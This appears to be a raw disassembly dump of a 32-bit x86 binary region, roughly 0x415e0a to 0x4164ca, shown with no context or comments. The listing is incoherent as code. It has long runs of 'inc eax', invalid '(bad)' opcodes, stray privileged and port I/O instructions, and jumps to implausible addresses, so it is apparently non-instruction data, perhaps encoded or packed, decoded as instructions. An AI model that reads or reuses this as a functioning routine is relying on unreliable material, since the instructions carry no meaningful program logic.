  415e0a:	inc    DWORD PTR [eax-0x25]
  415e0d:	loop   0x415de0
  415e0f:	xor    al,0x4a
  415e11:	xchg   edi,ebx
  415e13:	cmp    BYTE PTR [edi+edi*4],ah
  415e16:	push   edx
  415e17:	inc    eax
  415e18:	addr16 inc edi
  415e1a:	idiv   DWORD PTR [esi+0x43]
  415e1d:	or     DWORD PTR [ecx+0x5c5f4228],esi
  415e23:	cmp    al,0x33
  415e25:	pop    eax
  415e26:	sbb    BYTE PTR [eax+0x34],al
  415e29:	cmp    esp,DWORD PTR [edx-0xc]
  415e2c:	test   al,0x3e
  415e2e:	fadd   DWORD PTR [eax+0x40]
  415e31:	inc    eax
  415e32:	inc    eax
  415e33:	inc    eax
  415e34:	inc    eax
  415e35:	inc    eax
  415e36:	inc    eax
  415e37:	inc    eax
  415e38:	inc    eax
  415e39:	jl     0x415e7a
  415e3b:	adc    dh,dl
  415e3d:	lods   al,BYTE PTR ds:[esi]
  415e3e:	inc    eax
  415e3f:	inc    edi
  415e40:	inc    ecx
  415e41:	mov    esi,0xeadc807a
  415e46:	xor    edi,edi
  415e48:	jg     0x415e5e
  415e4a:	aad    0x63
  415e4c:	bound  esi,QWORD PTR [edx+0x6c]
  415e4f:	imul   edx,DWORD PTR [ecx+0x40],0x63384b52
  415e56:	pop    edx
  415e57:	inc    eax
  415e58:	inc    eax
  415e59:	inc    eax
  415e5a:	inc    eax
  415e5b:	inc    eax
  415e5c:	inc    eax
  415e5d:	inc    eax
  415e5e:	inc    eax
  415e5f:	add    BYTE PTR [esi-0x61],dl
  415e62:	inc    eax
  415e63:	inc    edx
  415e64:	addr16 popf 
  415e66:	jns    0x415eab
  415e68:	rcr    DWORD PTR [edi+0x28213440],cl
  415e6e:	jo     0x415e41
  415e70:	and    cl,BYTE PTR [edx]
  415e72:	inc    eax
  415e73:	ror    ch,0x30
  415e76:	arpl   WORD PTR [esi],di
  415e78:	xchg   ebp,eax
  415e79:	fild   WORD PTR [eax+0x28]
  415e7c:	adc    al,BYTE PTR [eax+0x40]
  415e7f:	inc    eax
  415e80:	inc    eax
  415e81:	inc    eax
  415e82:	inc    eax
  415e83:	and    eax,0xa3404040
  415e88:	inc    ebx
  415e89:	bound  ebx,QWORD PTR [ebp+0xa]
  415e8c:	inc    eax
  415e8d:	pusha  
  415e8e:	dec    eax
  415e8f:	test   al,0xec
  415e91:	push   0x73
  415e93:	fild   WORD PTR [eax+0x5e]
  415e96:	push   cs
  415e97:	adc    ah,BYTE PTR [edi+0x74]
  415e9a:	imul   DWORD PTR [esi+0x40]
  415e9d:	pop    DWORD PTR gs:[ecx-0x64]
  415ea1:	inc    ecx
  415ea2:	dec    ecx
  415ea3:	jbe    0x415ee5
  415ea5:	inc    edx
  415ea6:	bound  eax,QWORD PTR [eax+0x40]
  415ea9:	inc    eax
  415eaa:	inc    eax
  415eab:	inc    eax
  415eac:	inc    eax
  415ead:	inc    eax
  415eae:	inc    eax
  415eaf:	inc    eax
  415eb0:	inc    eax
  415eb1:	dec    ebx
  415eb2:	adc    eax,0x4071b843
  415eb7:	xor    al,0xa7
  415eb9:	and    al,0xc9
  415ebb:	xor    BYTE PTR [eax+0x5c],ch
  415ebe:	inc    eax
  415ebf:	aad    0x28
  415ec1:	aad    0xac
  415ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ec4:	inc    eax
  415ec5:	nop
  415ec6:	inc    eax
  415ec7:	jno    0x415e7f
  415ec9:	pop    edx
  415eca:	adc    eax,0x40606040
  415ecf:	aad    0x46
  415ed1:	mov    cl,0x42
  415ed3:	xor    DWORD PTR [ebp+0x40],eax
  415ed6:	inc    eax
  415ed7:	inc    eax
  415ed8:	inc    eax
  415ed9:	inc    eax
  415eda:	inc    eax
  415edb:	rol    DWORD PTR [eax+0x40],0x41
  415edf:	inc    eax
  415ee0:	push   edx
  415ee1:	mov    ch,0x58
  415ee3:	pop    esi
  415ee4:	ins    BYTE PTR es:[edi],dx
  415ee5:	cmp    eax,0xb49e4091
  415eea:	sub    cl,al
  415eec:	inc    eax
  415eed:	inc    eax
  415eee:	add    BYTE PTR [eax+0x40],al
  415ef1:	inc    eax
  415ef2:	inc    eax
  415ef3:	inc    eax
  415ef4:	inc    eax
  415ef5:	ja     0x415f3c
  415ef7:	aaa    
  415ef8:	inc    eax
  415ef9:	cmp    BYTE PTR ds:0x3f43a045,dl
  415eff:	push   ebx
  415f00:	inc    eax
  415f01:	cmp    BYTE PTR [ecx-0x52],al
  415f04:	pusha  
  415f05:	rol    DWORD PTR [ebp-0x65],1
  415f08:	inc    eax
  415f09:	sub    dl,ah
  415f0b:	mov    eax,ds:0x533f99a1
  415f10:	inc    eax
  415f11:	nop
  415f12:	cli    
  415f13:	inc    eax
  415f14:	inc    eax
  415f15:	inc    eax
  415f16:	inc    eax
  415f17:	inc    eax
  415f18:	inc    eax
  415f19:	inc    eax
  415f1a:	inc    eax
  415f1b:	inc    eax
  415f1c:	inc    eax
  415f1d:	xchg   ecx,eax
  415f1e:	gs jbe 0x415f21
  415f21:	mov    bl,0x40
  415f23:	pusha  
  415f24:	mov    dl,0x42
  415f26:	pop    esi
  415f27:	inc    ebx
  415f28:	mov    edi,0xd93404a
  415f2d:	cli    
  415f2e:	call   0x40772ebb
  415f33:	arpl   WORD PTR [ecx+0x44],ax
  415f36:	inc    eax
  415f37:	inc    eax
  415f38:	inc    eax
  415f39:	inc    eax
  415f3a:	inc    eax
  415f3b:	inc    eax
  415f3c:	int3   
  415f3d:	jne    0x415f7f
  415f3f:	xchg   esp,eax
  415f40:	inc    ecx
  415f41:	push   eax
  415f42:	cmp    BYTE PTR [eax+0x42],al
  415f45:	ret    
  415f46:	add    al,BYTE PTR ds:0x401fff43
  415f4c:	fsubr  DWORD PTR [edi]
  415f4e:	inc    eax
  415f4f:	add    cl,al
  415f51:	inc    eax
  415f52:	inc    eax
  415f53:	inc    eax
  415f54:	inc    eax
  415f55:	add    BYTE PTR [eax+0x40],al
  415f58:	xchg   DWORD PTR [eax],esi
  415f5a:	or     bh,BYTE PTR [eax]
  415f5c:	inc    eax
  415f5d:	jmp    0x415f58
  415f5f:	push   ss
  415f60:	mov    al,gs:0x40401ff7
  415f66:	inc    eax
  415f67:	inc    eax
  415f68:	inc    eax
  415f69:	inc    eax
  415f6a:	inc    eax
  415f6b:	inc    eax
  415f6c:	inc    DWORD PTR [eax+0x40]
  415f6f:	ja     0x415f21
  415f71:	imul   ebp,DWORD PTR [edi+0x40],0xa
  415f75:	push   eax
  415f76:	inc    eax
  415f77:	int    0x5
  415f79:	mov    eax,ds:0x51ff3162
  415f7e:	inc    eax
  415f7f:	arpl   WORD PTR [ecx-0x7f],ax
  415f82:	mov    BYTE PTR [eax+eax*1+0x79],ch
  415f86:	inc    eax
  415f87:	mov    es,WORD PTR [ecx+0x42]
  415f8a:	not    BYTE PTR [edi+ebx*2]
  415f8d:	xor    DWORD PTR [eax+0x30],eax
  415f90:	inc    eax
  415f91:	inc    eax
  415f92:	inc    eax
  415f93:	inc    eax
  415f94:	inc    eax
  415f95:	inc    eax
  415f96:	inc    eax
  415f97:	inc    eax
  415f98:	inc    eax
  415f99:	inc    eax
  415f9a:	shl    dh,0x4f
  415f9d:	inc    edi
  415f9e:	ror    DWORD PTR [eax+0x40],1
  415fa1:	push   ebp
  415fa2:	xor    cl,BYTE PTR [edi-0x70]
  415fa5:	lds    edx,FWORD PTR [ebx-0x50]
  415fa8:	inc    eax
  415fa9:	stos   DWORD PTR es:[edi],eax
  415faa:	clc    
  415fab:	les    eax,FWORD PTR [ecx-0x5]
  415fae:	push   0x74
  415fb0:	inc    eax
  415fb1:	nop
  415fb2:	scas   al,BYTE PTR es:[edi]
  415fb3:	inc    eax
  415fb4:	inc    eax
  415fb5:	inc    eax
  415fb6:	inc    eax
  415fb7:	inc    eax
  415fb8:	inc    eax
  415fb9:	inc    eax
  415fba:	inc    eax
  415fbb:	add    al,dh
  415fbd:	sbb    bh,BYTE PTR [ecx]
  415fbf:	adc    edi,DWORD PTR [esi+0x4d159840]
  415fc5:	les    ecx,FWORD PTR [ecx-0x24bfb792]
  415fcb:	inc    ecx
  415fcc:	adc    al,0xc0
  415fce:	sbb    dl,bl
  415fd0:	inc    eax
  415fd1:	inc    eax
  415fd2:	inc    eax
  415fd3:	inc    eax
  415fd4:	inc    eax
  415fd5:	inc    eax
  415fd6:	and    eax,0xbd404040
  415fdb:	inc    eax
  415fdc:	and    BYTE PTR [ecx-0x37],al
  415fdf:	dec    ebx
  415fe0:	inc    ecx
  415fe1:	enter  0x4047,0xd4
  415fe5:	shr    ah,0x2d
  415fe8:	inc    ebx
  415fe9:	xchg   ecx,eax
  415fea:	mov    ecx,0x4d2d6240
  415fef:	ins    DWORD PTR es:[edi],dx
  415ff0:	xor    BYTE PTR [edi-0x55abfb0],bh
  415ff6:	inc    eax
  415ff7:	inc    eax
  415ff8:	inc    eax
  415ff9:	inc    eax
  415ffa:	inc    eax
  415ffb:	inc    eax
  415ffc:	inc    eax
  415ffd:	inc    eax
  415ffe:	inc    eax
  415fff:	inc    eax
  416000:	add    al,0xa8
  416002:	pushf  
  416003:	adc    BYTE PTR [ebx],ah
  416005:	inc    eax
  416006:	sub    BYTE PTR [ecx+ecx*8-0x37aabfee],0x40
  41600e:	test   al,0xd
  416010:	inc    eax
  416011:	add    dh,BYTE PTR [ecx]
  416013:	outs   dx,BYTE PTR ds:[esi]
  416014:	and    DWORD PTR [eax+0x12],eax
  416017:	inc    ecx
  416018:	mov    DWORD PTR [ebx+0x40e0536c],ebx
  41601e:	mov    eax,0x40404040
  416023:	inc    eax
  416024:	inc    eax
  416025:	rol    DWORD PTR [eax+0x40],0x41
  416029:	inc    edi
  41602a:	bound  esi,QWORD PTR [ecx]
  41602c:	outs   dx,BYTE PTR ds:[esi]
  41602d:	mov    ch,0x40
  41602f:	inc    edx
  416030:	ror    BYTE PTR [ebx],0xac
  416033:	dec    esi
  416034:	xor    eax,0x25224006
  416039:	cmp    al,0xd
  41603b:	in     eax,dx
  41603c:	leave  
  41603d:	mov    eax,ds:0x64f9d840
  416042:	push   ebx
  416043:	mov    esi,0x62402095
  416048:	stos   BYTE PTR es:[edi],al
  416049:	fld    DWORD PTR [eax+0x40]
  41604c:	add    BYTE PTR [eax+0x40],al
  41604f:	inc    eax
  416050:	inc    eax
  416051:	inc    eax
  416052:	inc    eax
  416053:	ret    0x7133
  416056:	jae    0x416098
  416058:	and    BYTE PTR ds:0x75f59648,al
  41605e:	pop    ebx
  41605f:	inc    eax
  416060:	mov    al,ds:0x43900541
  416065:	inc    eax
  416066:	inc    eax
  416067:	inc    eax
  416068:	inc    eax
  416069:	inc    eax
  41606a:	inc    eax
  41606b:	inc    eax
  41606c:	inc    eax
  41606d:	inc    eax
  41606e:	inc    eax
  41606f:	inc    esp
  416070:	arpl   WORD PTR [eax+0x52],ax
  416073:	inc    edx
  416074:	retf   
  416075:	dec    esp
  416076:	xor    edi,DWORD PTR [ecx-0x3bd3bf41]
  41607c:	inc    ecx
  41607d:	int3   
  41607e:	cwde   
  41607f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  416081:	inc    eax
  416082:	mov    eax,0x40404040
  416087:	inc    eax
  416088:	inc    eax
  416089:	int3   
  41608a:	jne    0x4160cc
  41608c:	xor    al,0x60
  41608e:	imul   eax,DWORD PTR [eax+0x71],0xf8624064
  416095:	pop    esp
  416096:	arpl   WORD PTR [ecx],si
  416098:	pop    eax
  416099:	xor    al,BYTE PTR [eax+0x31]
  41609c:	test   al,0x62
  41609e:	or     BYTE PTR [edx+edx*1-0x6e],ch
  4160a2:	inc    eax
  4160a3:	sub    al,0x15
  4160a5:	dec    edi
  4160a6:	test   al,0x40
  4160a8:	add    cl,al
  4160aa:	inc    eax
  4160ab:	inc    eax
  4160ac:	inc    eax
  4160ad:	inc    eax
  4160ae:	add    BYTE PTR [eax-0x32],al
  4160b1:	mov    edi,0x415740e1
  4160b6:	sub    BYTE PTR [eax],dl
  4160b8:	inc    ebx
  4160b9:	es dec ebx
  4160bb:	inc    eax
  4160bc:	mov    al,0x42
  4160be:	jge    0x416108
  4160c0:	shl    DWORD PTR [ebx+0x23],1
  4160c3:	inc    eax
  4160c4:	sbb    ah,ah
  4160c6:	test   al,0x41
  4160c8:	jb     0x4160a0
  4160ca:	push   ebp
  4160cb:	inc    eax
  4160cc:	and    edx,edi
  4160ce:	adc    BYTE PTR [eax],ah
  4160d0:	inc    eax
  4160d1:	inc    eax
  4160d2:	inc    eax
  4160d3:	inc    eax
  4160d4:	inc    eax
  4160d5:	inc    eax
  4160d6:	inc    eax
  4160d7:	inc    eax
  4160d8:	inc    DWORD PTR [eax+0xd]
  4160db:	or     al,0x61
  4160dd:	inc    eax
  4160de:	push   ebx
  4160df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160e0:	or     BYTE PTR [eax+0x404c0cda],dl
  4160e6:	fisttp QWORD PTR ds:0xbd69628f
  4160ec:	and    DWORD PTR [eax+0x58],eax
  4160ef:	inc    ecx
  4160f0:	pop    edx
  4160f1:	inc    eax
  4160f2:	inc    ecx
  4160f3:	add    al,0x6
  4160f5:	inc    eax
  4160f6:	(bad)  
  4160f8:	inc    edx
  4160f9:	sub    al,BYTE PTR [ebx-0x6d]
  4160fc:	inc    eax
  4160fd:	inc    eax
  4160fe:	inc    eax
  4160ff:	inc    eax
  416100:	inc    eax
  416101:	inc    eax
  416102:	inc    eax
  416103:	inc    eax
  416104:	inc    eax
  416105:	inc    eax
  416106:	loop   0x416148
  416108:	dec    esp
  416109:	cmp    eax,esp
  41610b:	xor    dh,BYTE PTR [eax]
  41610d:	cmp    bh,BYTE PTR [edx]
  41610f:	inc    eax
  416110:	leave  
  416111:	stc    
  416112:	rcl    BYTE PTR [si-0x1ed],cl
  416117:	inc    eax
  416118:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41611a:	retf   
  41611b:	bound  eax,QWORD PTR [eax+0x10]
  41611e:	push   edi
  41611f:	inc    eax
  416120:	dec    esi
  416121:	mov    WORD PTR [eax+0x40],es
  416124:	inc    eax
  416125:	inc    eax
  416126:	inc    eax
  416127:	inc    eax
  416128:	inc    eax
  416129:	inc    eax
  41612a:	add    BYTE PTR [eax-0x5feccebd],dl
  416130:	inc    eax
  416131:	dec    esp
  416132:	test   DWORD PTR [esp+edi*1+0x40247c6c],0x6f2c33cb
  41613d:	jmp    0x4160da
  41613f:	pusha  
  416140:	inc    eax
  416141:	es clc 
  416143:	lods   al,BYTE PTR ds:[esi]
  416144:	ins    BYTE PTR es:[edi],dx
  416145:	inc    ebx
  416146:	pop    ds
  416147:	popa   
  416148:	inc    eax
  416149:	push   eax
  41614a:	rcr    DWORD PTR ds:[edi],0xd1
  41614e:	pop    es
  41614f:	or     eax,DWORD PTR [eax+0x35]
  416152:	inc    eax
  416153:	inc    eax
  416154:	inc    eax
  416155:	inc    eax
  416156:	inc    eax
  416157:	inc    eax
  416158:	and    eax,0xab404040
  41615d:	retf   
  41615e:	fisttp QWORD PTR [ebx+0x4640a215]
  416164:	mov    esp,0x7b240de
  416169:	or     DWORD PTR [eax+0xb],eax
  41616c:	inc    edx
  41616d:	pusha  
  41616e:	clc    
  41616f:	push   eax
  416170:	pop    ds
  416171:	retf   0x8440
  416174:	je     0x41616a
  416176:	fwait
  416177:	inc    eax
  416178:	inc    eax
  416179:	inc    eax
  41617a:	inc    eax
  41617b:	inc    eax
  41617c:	inc    eax
  41617d:	inc    eax
  41617e:	inc    eax
  41617f:	inc    eax
  416180:	inc    eax
  416181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416182:	dec    edx
  416183:	loope  0x4161c5
  416185:	bound  edi,QWORD PTR [esi+eiz*2+0x57f34184]
  41618c:	inc    eax
  41618d:	test   DWORD PTR [edx+0x5d],esp
  416190:	leave  
  416191:	inc    ebx
  416192:	jnp    0x4161c7
  416194:	inc    eax
  416195:	sub    al,0x79
  416197:	xchg   esp,eax
  416198:	dec    eax
  416199:	xor    bh,dh
  41619b:	mov    DWORD PTR [eax+0x66],0x9063723c
  4161a2:	pop    esi
  4161a3:	popa   
  4161a4:	inc    eax
  4161a5:	inc    eax
  4161a6:	je     0x4161de
  4161a8:	inc    eax
  4161a9:	inc    eax
  4161aa:	inc    eax
  4161ab:	inc    eax
  4161ac:	inc    eax
  4161ad:	inc    eax
  4161ae:	rol    DWORD PTR [eax+0x40],0x5b
  4161b2:	inc    eax
  4161b3:	mov    dl,0xf7
  4161b5:	inc    eax
  4161b6:	mov    BYTE PTR [ebp+eax*2+0x4e7431e0],bl
  4161bd:	inc    eax
  4161be:	sub    ebx,DWORD PTR [eax+eax*2+0x40]
  4161c2:	add    BYTE PTR [eax+0x40],al
  4161c5:	inc    eax
  4161c6:	inc    eax
  4161c7:	inc    eax
  4161c8:	inc    eax
  4161c9:	add    al,BYTE PTR [edx+0x6c]
  4161cc:	push   0x65
  4161ce:	inc    eax
  4161cf:	or     BYTE PTR [edx+ecx*8+0x3c],0x88
  4161d4:	xchg   ebx,eax
  4161d5:	or     DWORD PTR [eax-0x9],eax
  4161d8:	cmp    eax,0x404040c3
  4161dd:	inc    eax
  4161de:	inc    eax
  4161df:	inc    eax
  4161e0:	inc    eax
  4161e1:	inc    eax
  4161e2:	inc    eax
  4161e3:	inc    eax
  4161e4:	leave  
  4161e5:	inc    ebx
  4161e6:	ins    DWORD PTR es:[edi],dx
  4161e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161e8:	inc    eax
  4161e9:	arpl   WORD PTR [ecx+0x40],si
  4161ec:	pop    ebx
  4161ed:	shl    DWORD PTR [ebx-0x638fbf7e],1
  4161f3:	inc    eax
  4161f4:	sbb    ebp,0x344061bb
  4161fa:	add    eax,0x6b753f7b
  4161ff:	test   BYTE PTR [eax+0x40],al
  416202:	retf   
  416203:	inc    eax
  416204:	inc    eax
  416205:	inc    eax
  416206:	inc    eax
  416207:	inc    eax
  416208:	inc    eax
  416209:	int3   
  41620a:	jne    0x41624c
  41620c:	test   BYTE PTR [edx+0x40611fb9],0xa0
  416213:	jl     0x4161bd
  416215:	in     eax,0x63
  416217:	push   edi
  416218:	dec    ebp
  416219:	inc    eax
  41621a:	inc    ecx
  41621b:	daa    
  41621c:	inc    eax
  41621d:	add    cl,al
  41621f:	inc    eax
  416220:	inc    eax
  416221:	inc    eax
  416222:	inc    eax
  416223:	add    BYTE PTR [eax-0x4c],al
  416226:	es inc ecx
  416228:	mov    cl,0x23
  41622a:	inc    eax
  41622b:	popf   
  41622c:	pushf  
  41622d:	add    eax,0x4b6447b4
  416232:	inc    eax
  416233:	inc    eax
  416234:	inc    eax
  416235:	inc    eax
  416236:	inc    eax
  416237:	inc    eax
  416238:	inc    eax
  416239:	inc    eax
  41623a:	inc    DWORD PTR [eax+0x40]
  41623d:	call   0x25272b45
  416242:	push   ebp
  416243:	and    DWORD PTR [eax+0x62],eax
  416246:	mov    cl,0x46
  416248:	lds    ecx,FWORD PTR [esp+eiz*2+0x6340404c]
  41624f:	bound  eax,QWORD PTR [eax+0x40]
  416252:	inc    eax
  416253:	inc    eax
  416254:	inc    eax
  416255:	inc    eax
  416256:	inc    eax
  416257:	inc    eax
  416258:	inc    eax
  416259:	inc    eax
  41625a:	inc    ebx
  41625b:	inc    esp
  41625c:	pop    edi
  41625d:	loope  0x41629f
  41625f:	xchg   edx,eax
  416260:	xor    esp,eax
  416262:	sub    al,0x51
  416264:	inc    esi
  416265:	push   ebp
  416266:	inc    eax
  416267:	les    ebp,FWORD PTR [esp+ebx*2+0x21516be1]
  41626e:	inc    eax
  41626f:	dec    edi
  416270:	arpl   cx,si
  416272:	test   al,0xaf
  416274:	outs   dx,DWORD PTR ds:[esi]
  416275:	mov    edi,0xa8484140
  41627a:	adc    BYTE PTR [ebp+0x40404033],ah
  416280:	inc    eax
  416281:	inc    eax
  416282:	inc    eax
  416283:	inc    eax
  416284:	inc    eax
  416285:	add    BYTE PTR [ebp+0x40],cl
  416288:	ins    BYTE PTR es:[edi],dx
  416289:	xor    al,0x40
  41628b:	mov    eax,0x40234743
  416290:	in     al,dx
  416291:	inc    eax
  416292:	sub    al,BYTE PTR [ecx-0x2e]
  416295:	push   edx
  416296:	js     0x4162d8
  416298:	gs push esp
  41629a:	adc    BYTE PTR [edx+edx*4+0x22],bh
  41629e:	loope  0x4162e0
  4162a0:	arpl   WORD PTR [eax+0x40],ax
  4162a3:	inc    eax
  4162a4:	inc    eax
  4162a5:	inc    eax
  4162a6:	inc    eax
  4162a7:	and    eax,0x41404040
  4162ac:	inc    edx
  4162ad:	push   esp
  4162ae:	(bad)  
  4162af:	mov    esi,0x3cec4082
  4162b4:	inc    ebx
  4162b5:	scas   al,BYTE PTR es:[di]
  4162b7:	dec    esp
  4162b8:	mov    eax,ds:0x8794cb40
  4162bd:	push   esp
  4162be:	data16 mov bl,0x48
  4162c1:	inc    eax
  4162c2:	inc    eax
  4162c3:	inc    eax
  4162c4:	inc    eax
  4162c5:	inc    eax
  4162c6:	inc    eax
  4162c7:	inc    eax
  4162c8:	inc    eax
  4162c9:	inc    eax
  4162ca:	inc    eax
  4162cb:	inc    eax
  4162cc:	test   al,0x63
  4162ce:	cwde   
  4162cf:	bound  ebp,QWORD PTR [eax]
  4162d1:	sub    BYTE PTR [ecx],ah
  4162d3:	inc    eax
  4162d4:	adc    cl,BYTE PTR ds:0x93424d62
  4162da:	dec    esi
  4162db:	inc    eax
  4162dc:	pushf  
  4162dd:	retf   
  4162de:	push   0xa25b1163
  4162e3:	inc    eax
  4162e4:	inc    ecx
  4162e5:	push   eax
  4162e6:	stos   DWORD PTR es:[edi],eax
  4162e7:	jne    0x416359
  4162e9:	xchg   ebp,eax
  4162ea:	inc    eax
  4162eb:	inc    eax
  4162ec:	inc    eax
  4162ed:	inc    eax
  4162ee:	inc    eax
  4162ef:	inc    eax
  4162f0:	rol    DWORD PTR [eax+0x40],0xa1
  4162f4:	inc    eax
  4162f5:	push   cs
  4162f6:	cmp    al,0x64
  4162f8:	and    al,0x62
  4162fa:	inc    edi
  4162fb:	xchg   esp,eax
  4162fc:	inc    eax
  4162fd:	dec    eax
  4162fe:	xchg   edi,eax
  4162ff:	or     cl,BYTE PTR [eax]
  416301:	inc    eax
  416302:	xor    esp,ebp
  416304:	inc    eax
  416305:	bound  ebp,QWORD PTR [edx+eiz*2+0x24]
  416309:	xor    al,al
  41630b:	cld    
  41630c:	inc    eax
  41630d:	leave  
  41630e:	and    esi,ebx
  416310:	cmc    
  416311:	ins    BYTE PTR es:[edi],dx
  416312:	xor    DWORD PTR [edx-0x6303abca],esp
  416318:	std    
  416319:	inc    edx
  41631a:	inc    eax
  41631b:	inc    eax
  41631c:	add    BYTE PTR [eax+0x40],al
  41631f:	inc    eax
  416320:	inc    eax
  416321:	inc    eax
  416322:	inc    eax
  416323:	mov    bx,0x604c
  416327:	outs   dx,DWORD PTR ds:[esi]
  416328:	arpl   di,bp
  41632a:	inc    ebx
  41632b:	shl    DWORD PTR [edi],1
  41632d:	push   edx
  41632e:	mov    edx,0xd1daf234
  416333:	inc    eax
  416334:	inc    eax
  416335:	inc    eax
  416336:	inc    eax
  416337:	inc    eax
  416338:	inc    eax
  416339:	inc    eax
  41633a:	inc    eax
  41633b:	inc    eax
  41633c:	inc    eax
  41633d:	add    BYTE PTR [ecx+0x5f],al
  416340:	push   edx
  416341:	inc    eax
  416342:	fdivr  QWORD PTR [edx+0x6c]
  416345:	shl    DWORD PTR [eax],cl
  416347:	(bad)  
  416348:	retf   
  416349:	mov    eax,0x47d1d069
  41634e:	ss mov ebp,0x10304170
  416354:	aam    0xf9
  416356:	push   es
  416357:	and    ch,ah
  416359:	aas    
  41635a:	or     DWORD PTR [eax-0x209e40c9],edx
  416360:	bound  eax,QWORD PTR [eax+0x40]
  416363:	inc    eax
  416364:	inc    eax
  416365:	inc    eax
  416366:	inc    eax
  416367:	int3   
  416368:	jne    0x4163aa
  41636a:	les    edx,FWORD PTR [eax+0x405e41ef]
  416370:	mov    ebp,0xda62a07d
  416375:	inc    ebx
  416376:	adc    esp,DWORD PTR [eax-0x37becfc0]
  41637c:	inc    eax
  41637d:	add    cl,al
  41637f:	inc    eax
  416380:	inc    eax
  416381:	inc    eax
  416382:	inc    eax
  416383:	add    BYTE PTR [eax+0x4b],al
  416386:	xor    BYTE PTR [edi+0x2c],al
  416389:	cmc    
  41638a:	add    eax,0x84d44599
  41638f:	xor    DWORD PTR [ebp+0x64],eax
  416392:	leave  
  416393:	imul   esi,DWORD PTR ds:0xe11c40c7,0x40
  41639a:	inc    esp
  41639b:	fs clc 
  41639d:	hlt    
  41639e:	xor    DWORD PTR [eax+0x40],eax
  4163a1:	inc    eax
  4163a2:	inc    eax
  4163a3:	inc    eax
  4163a4:	inc    eax
  4163a5:	inc    eax
  4163a6:	inc    eax
  4163a7:	inc    DWORD PTR [eax+0x33]
  4163aa:	ins    BYTE PTR es:[edi],dx
  4163ab:	inc    eax
  4163ac:	sub    BYTE PTR [eax-0x493bfc0],0xe1
  4163b3:	adc    al,bl
  4163b5:	inc    ecx
  4163b6:	cmc    
  4163b7:	imul   ebx,DWORD PTR [edi+0x13],0x40
  4163bb:	inc    eax
  4163bc:	inc    eax
  4163bd:	inc    eax
  4163be:	inc    eax
  4163bf:	inc    eax
  4163c0:	inc    eax
  4163c1:	inc    eax
  4163c2:	inc    eax
  4163c3:	inc    eax
  4163c4:	sbb    esi,DWORD PTR [ebp+0x42]
  4163c7:	es push 0x78f043ad
  4163cd:	dec    edx
  4163ce:	pop    eax
  4163cf:	and    DWORD PTR [eax+0x73],eax
  4163d2:	rcl    DWORD PTR [ebp-0x3f3b05f],1
  4163d8:	inc    ecx
  4163d9:	dec    eax
  4163da:	mov    WORD PTR [ebx+eax*4-0x64],es
  4163de:	push   esp
  4163df:	cmp    eax,0xf13d6740
  4163e4:	inc    eax
  4163e5:	inc    eax
  4163e6:	inc    eax
  4163e7:	inc    eax
  4163e8:	inc    eax
  4163e9:	inc    eax
  4163ea:	inc    eax
  4163eb:	inc    eax
  4163ec:	add    BYTE PTR [ecx],ah
  4163ee:	(bad)  
  4163ef:	sub    eax,0x32b413c
  4163f4:	sbb    DWORD PTR [edi],edx
  4163f6:	pusha  
  4163f7:	xor    cl,BYTE PTR [eax+0x28]
  4163fa:	int3   
  4163fb:	int    0x15
  4163fd:	mov    al,ds:0x4c150961
  416402:	gs inc ecx
  416404:	inc    ecx
  416405:	and    eax,0x2acb52dc
  41640a:	cwde   
  41640b:	inc    ebx
  41640c:	xor    DWORD PTR [ebx],eax
  41640e:	inc    eax
  41640f:	inc    eax
  416410:	inc    eax
  416411:	inc    eax
  416412:	inc    eax
  416413:	inc    eax
  416414:	and    eax,0x8e404040
  416419:	or     eax,0x300dccb4
  41641e:	mov    edi,0x41cc4022
  416423:	inc    ebp
  416424:	leave  
  416425:	sbb    BYTE PTR ds:0x386240b3,0xf4
  41642c:	mov    al,0x40
  41642e:	icebp  
  41642f:	inc    eax
  416430:	inc    eax
  416431:	push   edx
  416432:	inc    eax
  416433:	inc    eax
  416434:	inc    eax
  416435:	inc    eax
  416436:	inc    eax
  416437:	inc    eax
  416438:	inc    eax
  416439:	inc    eax
  41643a:	inc    eax
  41643b:	inc    eax
  41643c:	fcomp  DWORD PTR [eax+0x29463141]
  416442:	pusha  
  416443:	lds    esp,FWORD PTR [eax-0x4e93849d]
  416449:	test   al,0xc1
  41644b:	dec    edi
  41644c:	add    eax,0xdf7ce8d4
  416451:	add    DWORD PTR [ebx+ebp*8],ebp
  416454:	retf   
  416455:	or     eax,0x2151439c
  41645a:	ret    
  41645b:	aas    
  41645c:	ins    DWORD PTR es:[edi],dx
  41645d:	leave  
  41645e:	sbb    BYTE PTR [eax+0x40],al
  416461:	inc    eax
  416462:	inc    eax
  416463:	inc    eax
  416464:	inc    eax
  416465:	rol    DWORD PTR [eax+0x40],0xd1
  416469:	imul   ebp,DWORD PTR [ebp+0x3c],0xe1d04162
  416470:	das    
  416471:	icebp  
  416472:	jmp    0x594de3e
  416477:	xlat   BYTE PTR gs:[ebx]
  416479:	inc    eax
  41647a:	inc    eax
  41647b:	add    BYTE PTR [eax+0x40],al
  41647e:	inc    eax
  41647f:	inc    eax
  416480:	inc    eax
  416481:	inc    eax
  416482:	or     ebp,DWORD PTR [ebx+0x2c]
  416485:	and    al,0x34
  416487:	leave  
  416488:	imul   edi,edx,0xffffffb3
  41648b:	loope  0x4164de
  41648d:	mov    al,ds:0x22f04447
  416492:	inc    esp
  416493:	add    al,0xfc
  416495:	add    eax,0x41900a24
  41649a:	adc    DWORD PTR [esp+edi*8-0x79],esp
  41649e:	(bad)  
  41649f:	retf   
  4164a0:	sub    al,BYTE PTR [edi-0x4]
  4164a3:	inc    eax
  4164a4:	inc    eax
  4164a5:	inc    eax
  4164a6:	inc    eax
  4164a7:	inc    eax
  4164a8:	inc    eax
  4164a9:	inc    eax
  4164aa:	inc    eax
  4164ab:	inc    eax
  4164ac:	inc    eax
  4164ad:	test   eax,0x429a4740
  4164b2:	frstor [ecx+esi*8]
  4164b5:	ins    DWORD PTR es:[edi],dx
  4164b6:	inc    eax
  4164b7:	inc    ecx
  4164b8:	test   al,0xcb
  4164ba:	int    0x40
  4164bc:	inc    eax
  4164bd:	inc    eax
  4164be:	inc    eax
  4164bf:	inc    eax
  4164c0:	inc    eax
  4164c1:	int3   
  4164c2:	jne    0x416504
  4164c4:	cld    
  4164c5:	pop    eax
  4164c6:	pusha  
  4164c7:	inc    eax
  4164c8:	jge    0x4164dc
  4164ca:	dec    esp
